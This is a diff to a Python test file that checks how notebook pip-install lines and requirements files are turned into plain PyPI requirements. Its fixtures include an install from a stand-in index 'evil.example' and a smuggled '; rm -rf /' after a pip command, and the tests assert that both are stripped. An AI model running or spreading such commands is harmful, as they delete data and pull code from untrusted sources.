@@ -109,4 +109,31 @@ def test_a_notebook_becomes_its_code_cells():
 	nb = {"cells": [{"cell_type": "markdown", "source": "# hi"},
 		{"cell_type": "code", "source": ["!pip install x\n", "bs = 4\n"]}]}  # fmt: skip
 	got = fetch({"kind": "notebook", "files": {"dir/run.ipynb": json.dumps(nb)}})
-	assert got.files == {"run.py": "# !pip install x\nbs = 4\n\n"} and got.entrypoint == "run.py"
+	assert got.files == {"run.py": "# !pip install x\nbs = 4\n\n", "requirements.txt": "x\n"}
+	assert got.entrypoint == "run.py"
+
+
+def test_notebook_pip_lines_become_plain_requirements():
+	from preflight.runner.sources import notebook_requirements
+
+	script = "\n".join([
+		"# !pip install -q -U peft==0.13.2 'trl>=0.12' -r reqs.txt",
+		"# %pip install --index-url https://evil.example datasets",
+		"# !python -m pip install bitsandbytes; rm -rf /",
+		"# !pip install peft==0.13.2",
+		"x = 1",
+	])  # fmt: skip
+	assert notebook_requirements(script) == ["peft==0.13.2", "trl>=0.12", "datasets", "bitsandbytes"]
+
+
+def test_requirements_keep_the_image_stack_and_skip_anything_but_plain_pypi_lines():
+	from preflight.recorder.requirements import plan
+
+	text = "\n".join([
+		"torch==2.6.0", "Transformers>=4.50", "sentencepiece==0.2.0", "einops", "rich[jupyter] ; python_version>'3'",
+		"-e .", "git+https://github.com/a/b", "https://x.example/p.whl", "./local", "--index-url https://x", "# c", "",
+	])  # fmt: skip
+	keep, notes = plan(text, {"torch": "2.5.1", "transformers": "4.46.3"})
+	assert keep == ["sentencepiece==0.2.0", "einops", "rich[jupyter] ; python_version>'3'"]
+	assert any("kept the image's torch 2.5.1" in n for n in notes)
+	assert sum("only plain PyPI" in n for n in notes) == 5
